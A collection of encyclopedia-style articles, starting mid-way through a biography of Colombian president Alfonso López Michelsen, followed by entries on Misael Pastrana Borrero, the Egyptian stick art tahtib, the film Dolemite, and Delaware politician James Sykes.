In 1966, López was elected as a senator and negotiated the return of the MRL to the Liberal Party in 1967. This same year López traveled to the city of Valledupar after being appointed by President Carlos Lleras Restrepo as the first governor of Cesar Department, a newly created province in the northern Caribbean Region of Colombia. López was able to trace his grandmothers&#x27; family ancestors &quot;the Pumarejos,&quot; back to this town. During those years, he was also instrumental in the creation of the Vallenato Legend Festival (nowadays, one of the most important cultural events in Colombia) along with vallenato composer Rafael Escalona and journalist Consuelo Araújo. He served as governor of Cesar from December 21, 1967, until August 14, 1968.

===Minister of Foreign Affairs===

A year later, he was appointed Minister of Foreign Affairs until the end of the presidential term of President Carlos Lleras Restrepo in 1970.

===Presidency (1974–1978)===

In 1974, López was chosen by the Liberal Party as their candidate for president, after defeating former president Carlos Lleras Restrepo in the party presidential primaries, with the support of former candidate (and presidential successor) Julio César Turbay. He won the general election by a large margin against the Conservative Party candidate Álvaro Gómez Hurtado, and the ANAPO candidate, María Eugenia Rojas. His 2,929,719 votes were the highest ever for any president until that time.

His inaugural presidential speech, delivered on August 7, 1974, is mostly remembered for calling the disputed border area in the Gulf of Venezuela by its native indigenous name, &quot;Gulf of Coquibacoa&quot; given by the Wayuus. In his speech he also promised to reduce the growing gap between farmer and urban populations and to fight poverty, messages that attracted the support of many left-wing political movements.

As a president, López declared economic emergency in order to correct the fiscal deficit, which allowed him to implement a number of regulatory measures to control spending, and to reduce subsidies and programs like the tax credit certificate (CAT) which reimbursed partial or total taxes for exporting companies. He also introduced a tax and fiscal reform which increased national saving, and allowed an increase in public investment and exports. Crop production increased 16%, and he also created public offices devoted to the improvement of farming. Under his government, also, power grids were expanded, and infrastructure investment increased. In contrast, inflation reached under his government its highest historical values, at around 32%.

Early support for his policies soon turned to fierce opposition, as many of his campaign promises, in particular those to make deals with unions and in the improvement of potable water access, went unfulfilled, and as subsidies were eliminated and inflation rose. Unions and other leftist activists had been accumulating frustration and resentment for decades after the killing of Jorge Eliécer Gaitán, and the subsequent violence, and the hope for a more open society that came with Lopez&#x27;s election turned into feelings of betrayal. As a result, and after three years as president the major Colombian Unions got together and managed to propose and organize a massive, general strike. The López administration took a hard approach towards the planned strike, calling it subversive and at some point threatening arrest and forbidding public meetings. This only enraged the participants, and the major unionists were joined by teachers, students, independent workers, housewives, guerrilla leaders, and even members of the opposition conservative party. The organizing committee demanded among other things salary increases, frozen prices for essential goods and public services fees, re-establishment of the right to meet and strike, and a reduction in work hours.

The strike, occurring on September 14, 1977, came to be known as the National Civil Strike, and it attracted such a large number of discontented participants that the organizing committee soon lost control of it. Major roads were blocked all over Bogota, and in many other cities around the country, and very soon many small skirmishes between protesters and riot police started occurring all over. The manifestations and skirmishes soon turned into riots, and protesters started pillaging big stores and vandalizing factories and cars. By 4 pm the major declared curfew which only made protesters more enraged. Hundreds of protesters were wounded, and thousands were arrested and assembled in the city&#x27;s Soccer stadium and bullfighting arena. Riots and skirmishes continued all night and well into the next day, which devastated the city. About 20 or 30 people died in the middle of it. As a consequence, unions declared victory and the López Michelsen&#x27;s government had to make concessions. However, the riot made his government adopt a harsher, more repressive stance.

===Post presidency===

Upon the end of his term in 1978, he again became the leader of Liberal Party. He ran for president again in 1982, but was defeated by the Conservative Party candidate, Belisario Betancur.

He continued to actively participate in the decision making of the Liberal Party until the early 1990s when he decided to withdraw from political activity. He was a regular columnist for the Colombian newspaper &quot;El Tiempo&quot; which drew attention to many critical issues. For this reason he was called &quot;el hombre que pone a pensar al pais&quot; (Spanish for &quot;The man who makes the country think&quot;).

Lopez Michelsen died in Bogotá on July 11, 2007, after suffering a heart attack.

<text>Misael Eduardo Pastrana Borrero (14 November 1923 – 21 August 1997) was a Colombian politician and lawyer who served as the 23rd President of Colombia from 1970 to 1974. He was also the father of the 30th President Andrés Pastrana Arango.

==Biography==
=== Personal life ===
Pastrana was born in Neiva, Huila.

Pastrana was a Colombian conservative politician, President of Colombia in the period 1970–1974. Born in the home of Misael Pastrana Pastrana and Elisa Borrero Perdomo, studied law in Javeriana University of Bogotá and in the Ferri Institute of Rome. He had been affiliated to the Conservative Party (which he would later rename as the Social Conservative Party). He was the private secretary of the President Mariano Ospina Pérez (1949-1952)and three times a minister during the second Liberal presidency of Alberto Lleras Camargo (1958-1962).

During the presidency of Carlos Lleras Restrepo, he was Minister of Government 1966–1968, led in Congress a constitutional reform and was Colombian ambassador in Washington from 1968 to 1969, when he returned to campaign for the presidency. President of the Sasakawa United Nations Environment Prize in recognition of his enacting of the world&#x27;s first Environmental Code for Natural Resources, after his death the UN instituted the yearly Pastrana Borrero Conference in New York during the prize&#x27;s award ceremony. Vice-president of Worldwide Prize for Peace of UNESCO. Founder of World Center of Computer Science with Jean-Jacques Serban-Schreiber in the seventies, before the personal computer existed. The Center brought in young minds such as Nicholas Negroponte. Founder member of Interaction, group of former heads of state and government to deal with contemporary issues and conflicts and to present recommendations to governments.

===Presidency===

During his four years in office, Pastrana was carefully progressive. He sought to increase employment opportunities with a famous four-point strategy. He attempted to boost national savings as a way of moving away from dependency on foreign investment and credit, and he extended pensions rights for many people.

At the same time, he was a champion of &quot;a car for every Colombian family&quot;, and was instrumental in bringing the French car-makers Renault to Colombia. He also promoted the first national environmental legislation in Latin America.

The end of his four year-term in office came in 1974, which also saw the end of the National Front governments. Pastrana then took on the mantle of the &quot;natural leader&quot; of the Conservative party. He proved unable to hold the different factions of the party together, however, and in consequence there has only been two Conservative presidents since his own term in office.

He died in Bogotá at the age of 73.
Married to María Cristina Arango Vega, with whom he had three sons and one daughter. His second son, Andrés Pastrana Arango, who was kidnapped by the Medellin Cartel while running for mayor of Bogotá, eventually served as president of Colombia from 1998 to 2002.

<doc id="1341539" wikidata="Q254093" url="?curid=1341539" title="Tahtib">
<text>Tahtib () is the term for a traditional stick-fighting martial art originally named &quot;fan a&#x27;nazaha wa-tahtib&quot; (&quot;the art of being straight and honest through the use of stick&quot;). The original martial version of tahtib later evolved into an Egyptian folk dance with a wooden stick. It is commonly described in English as a &quot;stick dance&quot;, &quot;cane dance&quot;, &quot;stick-dancing game&quot;, or as ritual mock combat accompanied by music. Nowadays, the word &quot;tahtib&quot; encompasses both martial practice and performance art. It is mainly practiced today in Upper Egypt. Tahtib is regularly performed for tourists in Luxor and Aswan.

The stick used in tahtib is about four feet in length and is called an &quot;asa&quot;, &quot;asaya&quot;, &quot;assaya&quot;, or &quot;nabboot&quot;. It is often flailed in large figure-eight patterns across the body with such speed that the displacement of air is loudly discernible.

== History ==

The oldest traces of tahtib were found on engravings from the archaeological site of Abusir, an extensive necropolis of the Old Kingdom period, located in the south-western suburbs of Cairo. On some of the reliefs of the Pyramid of Sahure (V dynasty, c. 2500 BC); the images and explanatory captions are particularly precise and accurate in their depiction of what seems to be military training using sticks. Tahtib, with archery and wrestling, was then among the three disciplines of warfare taught to soldiers.

Three of the 35 tombs of the Beni Hassan necropolis (XI-XII Dynasties, 1900 – 1700 BC) near the town of Minya, contain engravings showing scenes of tahtib. Similar engravings can be seen in the archaeological site of Tell el Amarna (XVIII Dynasty, 1350 BC), some 60 km south of Minya. In addition to its role as military training, tahtib matches were also popular among peasants and farmers. The first evidence of the festive representation of tahtib can only be seen in the New Empire (1500 – 1000 BC), as shown by the engravings on the walls of Luxor and Saqqâra Early Christian writings mention tahtib as a leisure activity and a popular art performed by men during weddings and celebrations. It is believed that tahtib developed as a game or performance art in this civilian context.

== Performance ==
As with its combative counterpart, the dance form of tahtib was originally performed by men, but female versions were later developed. In one form, the women dress as men and imitate the males. Another female variant is performed flirtatiously and with less aggression. The latter, called &quot;ra&#x27;s el assaya&quot; (dance of the stick) is incorporated into cabaret or Raqs sharqi performances. The stick used for this dance is generally more lightweight and hooked at one end like a cane. It is often embellished with metallic-coloured foil or sequins. The costume is a simple baladi dress. Performances include balancing the cane on the head, hip or shoulder.

=== Music ===
Music in tahtib features the &quot;tabl&quot; (bass drum) and mizmar (folk oboe). The right hand uses a heavier stick with a hooked head to beat out the &quot;dum&quot; (the deep sound from striking the center of the drum) which drive the heartbeat of the rhythm, while the left hand uses a light twig as a switch to produce rapid-fire staccato &quot;taks&quot; (the higher sound from striking the edge of the drum).

===Modern tahtib===
Modern tahtib is an attempt to re-explore the sources of tahtib as a fighting art, and to enrich them as a martial practice by codifying the techniques and teaching them structurally. As in traditional tahtib, the main target is the opponent&#x27;s head, as it is considered the most fragile and vulnerable part of the body. Consequently, techniques revolve around protecting one&#x27;s own head while reaching the head of the opponent. Victory can be attained either by a single clean touch to the head, or three touches to the body. Unlike its traditional counterpart, modern tahtib allows both women and men to practice in mixed groups.

<doc id="1341543" wikidata="Q1764969" url="?curid=1341543" title="Dolemite">
<text>Dolemite is a 1975 American blaxploitation crime comedy film and is also the name of its principal character, played by Rudy Ray Moore, who co-wrote the film and its soundtrack. Moore, who started his career as a stand-up comedian in the late 1960s, heard a rhymed toast about an urban hero named Dolemite from a regular at the record store where he worked, and decided to adopt the persona as an alter ego in his act.

The film focuses on a professional comedian, pimp, and nightclub owner. He serves a prison sentence after being framed by dirty cops, but he is released by the governor and tasked with dealing with his hometown&#x27;s illegal drug trade. He uses his prostitutes as a private army, since they are kung fu-trained martial artists.

==Plot==
Dolemite is a pimp, comedian, and nightclub owner who is serving twenty years in prison after being set up by a rival, Willie Green (D&#x27;Urville Martin), and framed by detectives Mitchell and White, at the direction of the mayor (Hy Pyke).

Released by the governor thanks to lobbying by fellow pimp &quot;Queen Bee&quot; (Lady Reed), Dolemite is freed in order to discover the source of the out of control drug problem in the &quot;Fourth Ward&quot; of the city, and take revenge on the corruption that put him in prison.

He rekindles his reputation on the streets while trying to get back his &quot;Total Experience&quot; club from the hands of Willie Green. He enlists the help of Queen Bee, a Black nationalist preacher hoarding guns for a revolution, and his own stable of kung fu-trained prostitutes to settle the various scores, while an undercover FBI agent (Jerry Jones) lurks in the shadows, following the proceedings and supporting Dolemite&#x27;s quest.

==Cast==
* Rudy Ray Moore as Dolemite
* Lady Reed as &quot;Queen Bee&quot;
* D&#x27;Urville Martin as Willie Green
* West Gale as Reverend Gibbs
* John Kerry as Detective Mitchell
* Jerry Jones as Blakely
* Hy Pyke as Mayor Daley
* Vainus Rackstraw as &quot;Creeper&quot;

==Production==
Moore first developed the character of Dolemite in his stand-up comedy routines, and the character later appeared on Moore&#x27;s 1970 debut album, &quot;Eat Out More Often&quot;, which reached the top 25 on the &quot;Billboard&quot; 200. He released several more comedy albums using this persona. In 1975, Moore decided to create a film about Dolemite, paying for most of the production out of his own pocket, and using many of his friends and fellow comedians as cast and crew. The film was directed by D&#x27;Urville Martin, who appears as the villain Willie Green.

==Release==
===Critical reception===
The film received middling reviews from film critics. On review aggregator Rotten Tomatoes, the film holds an approval rating of 57% based on 14 reviews, with an average score of 5/10. On Metacritic, the film received a score of 67 based on 6 reviews, indicating &quot;generally favorable reviews&quot;.

===Home media===
&quot;Dolemite&quot; was released on VHS in 1987 by Xenon Home Video (#X-006), 91 minutes

&quot;Dolemite&quot; was released to DVD on September 13, 2005, by Xenon Pictures and also as part of a boxed set (&quot;The Dolemite Collection&quot;) on the same date. A widescreen, high definition remastered version, from an original print of the film, was released on Blu-ray disc on April 26, 2016, by Vinegar Syndrome. The prior VHS and DVD releases from the early-1990s were incorrectly transferred with an open matte, which revealed the boom mic at the top of the frame frequently (with the correct matte in a theatrical presentation, this area would have been covered). Over the years, the appearance of the boom mic due to the oversight during the VHS and DVD transfer was the source of amusement by viewers, and in acknowledgement of this, the Blu-ray also features an open matte version as an alternate &quot;boom mic&quot; presentation.

==Legacy==
A sequel, &quot;The Human Tornado&quot;, was released in 1976. A second sequel, &quot;The Return of Dolemite&quot;, was released in 2002 and was later re-titled &quot;The Dolemite Explosion&quot; for DVD release. A quasi-sequel, &quot;Shaolin Dolemite&quot;, starring Rudy Ray Moore as &quot;Monk Ru-Dee&quot;, was released in 1999.

The action comedy movie &quot;Black Dynamite&quot; (2009) parodies &quot;Dolemite&quot; and other blaxploitation films.

A biographical film about Moore and the making of &quot;Dolemite&quot;, titled &quot;Dolemite Is My Name&quot; and starring Eddie Murphy as Rudy Ray Moore, was released theatrically and on Netflix in October 2019.

<text>James Sykes (1725 – April 4, 1792) was an American lawyer and politician from Dover, in Kent County, Delaware. He served in the Delaware General Assembly and was a Continental Congressman from Delaware.

==Early life and family==
Sykes was born in 1725, probably in New Castle, Delaware. He married Agnes Bell and had eight children: James, Stephen, George, Nathaniel, Ann, Harriet, Lucy Matilda, and Mary. They lived in Dover, Delaware, and were members of Christ Episcopal Church.

==Political career==
Sykes served as a lieutenant under Caesar Rodney in the Dover militia in 1756. In 1776 he was a delegate to the Delaware State Constitutional Convention held at Dover. From November 7, 1776, until January 10, 1777, Sykes served on the Council of Safety, a body which was appointed to act as the state&#x27;s executive until the Delaware General Assembly was able to choose the state&#x27;s first President and Privy Council. He served in the Continental Congress most of 1777. Also in 1777, Sykes was appointed Kent County Clerk of the Peace and Kent County Prothonotary. He served in these posts for the remainder of his life. Sykes served on the state&#x27;s Privy Council in 1780, and in the state&#x27;s second Constitutional Convention in 1792 until his death. He was appointed Judge of the High Court of Errors and Appeals of Delaware in 1792 and served until his death later that year.

==Death and legacy==
Sykes died in Dover, Delaware, on April 4, 1792, and is buried at Christ Episcopal Church there. His son, James Sykes Jr., served as Governor of Delaware, and his great-grandson George served as a Major General in the American Civil War.

==Almanac==
From 1776 until 1792 Delaware elections were held on the first day of October of the year noted. Terms for members of the General Assembly began on the twentieth day of October. Members of the Legislative Council had a term of three years. Three State Councilmen were elected, at large, from each county.
